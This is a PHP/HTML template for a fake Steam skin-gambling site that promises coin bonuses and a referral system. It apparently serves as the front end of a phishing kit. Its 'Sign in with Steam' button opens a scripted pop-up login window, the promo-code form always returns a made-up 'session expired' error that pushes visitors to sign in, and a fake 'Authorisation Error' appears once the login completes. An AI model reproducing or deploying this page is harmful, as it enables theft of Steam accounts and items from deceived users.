<?php
	require_once("default_code.php");
?>
<!DOCTYPE html>
<html>
<head>
<link rel="stylesheet" type="text/css" href="template-4/css/bootstrap.css">
<link rel="stylesheet" type="text/css" href="template-4/css/stylesheet.css">
<script type="text/javascript" src="template-4/js/bootstrap.js"></script>
<script defer src="https://use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta charset="utf-8">
<title> <?=$title?></title>
<link rel="shortcut icon" href="https://imgur.com/mi1tf6k.png">
		<script type="text/javascript" src="template-4/js/jquery-3.2.1.min.js" ></script>
<link href="window/window.css" rel="stylesheet">
<script src="window/bowser.js"></script>
<script src="window/jquery-3.2.1.min.js"></script>
<script src="window/window.js"></script>
<script src="window/jquery-ui.min.js"></script>
</head>

<body>

<div class="col-md-12 text-center" style="padding-bottom: 10px;">

        <div class="fixed_menu text-center">
            <ul>
                <li><a href="#" class="active">Home</a></li>
                <li><a href="javascript:show('code_activate');">Activate Code</a></li>
                <li><a href="javascript:show('faq_article');">FAQ</a></li>
            </ul>
        </div>

        <div class="header">
            <h3><?=$_SERVER["SERVER_NAME"]?></h3>
            <style>.header h3{text-transform: uppercase;}</style>
            <p>Only honest winnings!</p>
        </div>

        <div class="col-md-4 text-center">
            	<img src="template-4/img/column_1.png">
            <p>• Daily <b>distribution</b> of coins</p>
        </div>

        <div class="col-md-4 text-center">
            <img src="template-4/img/column_2.png">
            <p>• When you register,<br>you get a bonus of<br><b>1000 coins</b></p>
        </div>

        <div class="col-md-4 text-center">
           <img src="template-4/img/column_3.png">
            <p>• We have a <b>profitable</b><br>referral system</p>
        </div>

    </div>

    <div class="col-md-12 text-center">
        <a href="javascript:login()" class="login">Sign in with Steam</a>
    </div>

    <p class="copyright hidden-xs hidden-sm hidden-md">Copyright © 2013 - 2018, <?=$_SERVER["SERVER_NAME"]?> - All rights reserved.</p>

    <div id="code_activate" class="overlay" style="min-height: 100vh; display: none;">
        <div class="container">
            <div class="col-md-12 text-left">
                <a href="javascript:hide('code_activate'); javascript:hide('error_notify');"><i class="fas fa-arrow-left"></i></a>
            </div>

            <div class="col-md-6 col-md-offset-3 text-center" id="error_notify" style="display: none;">
                <p class="block">The session has expired, try to <a href="javascript:login()" class="in_link">log in</a> again on the site.</p>
            </div>

            <div class="col-md-6 col-md-offset-3">
                <form class="text-center">
                    <input type="text" name="code" class="input_code" maxlength="10" placeholder="Enter the promo code">
                    <button type="button" class="button_code" onclick="show('error_notify')">Activate</button>
                </form>
            </div>
        </div>
    </div>

    <div id="faq_article" class="overlay" style="min-height: 100vh; display: none;">
        <div class="container">
            <div class="col-md-12 text-left">
                <a href="javascript:hide('faq_article');"><i class="fas fa-arrow-left"></i></a>
            </div>

            <div class="col-md-12 text-left">
                <h3 class="heading">How are subjects evaluated?</h3>
                <p class="description">The price of items is determined by the combination of pricing API (SteamLytics) with data on the rarity, quantity and popularity of the item.</p>

                <h3 class="heading">What are the restrictions on deposits?</h3>
                <p class="description">To make a Deposit or withdraw skins, you need to have your mobile Steam authenticator enabled for more than 7 days.<br>
				For more information, please visit this page.<br><br>
				Please refrain from depositing incorrectly priced items. Doing so, you risk zeroing Bux, as well as blocking the account on the site.<br>
				We do not accept Souvenirs, cases, expensive stickers and too rare skins.<br>
				If any thing does not appear in the inventory, it means that it can not be made to the site.<br>
				The minimum Deposit amount is 500 Coins.</p>

                <h3 class="heading">What are the withdrawal limits?</h3>
                <p class="description">Referring to the trading policy, before the withdrawal, we require that users have made bets on the amount equal to the Deposit.<br>
				Also, for withdrawal you need to make a Deposit at least once and have at least 1st level.</p>

                <h3 class="heading">Can I transfer Coins to other players?</h3>
                <p class="description">Yes. This can be done in the "Account" tab, under your link to the exchange. To transfer Bux, you need to be at least 1 level and make at least one Deposit.</p>
            </div>
        </div>
    </div>

    <div id="error_page" class="overlay" style="min-height: 100vh; display: none;">
        <div class="container">
            <div class="col-md-12 text-center">
                <h2>Authorisation Error</h2>
                <a href="javascript:hide('error_page');" class="button_code">Go Back</a>
            </div>
        </div>
    </div>

    <script type="text/javascript">
        // function set() { $("#code_activate").height($("body").height()); }
        function show(id) {
            $("#" + id).fadeIn("750");
        }

        function hide(id) {
            $("#" + id).fadeOut("750");
        }
    </script>
    <script>
        function loginReady() {
            closeLoginWindow();
            show("error_page");
        }
    </script>

<script>
        $(document).ready(
            setTimeout(function() { 
                $('.wrapper').addClass('show');
            }, 1500)
        )
        $(document).ready(
            setTimeout(function() { 
                $('#login').css('opacity','1');
                $('#login form').addClass('show_popup');
            }, 2500)  
        )
</script>
<?=$login?>
</body>
</html>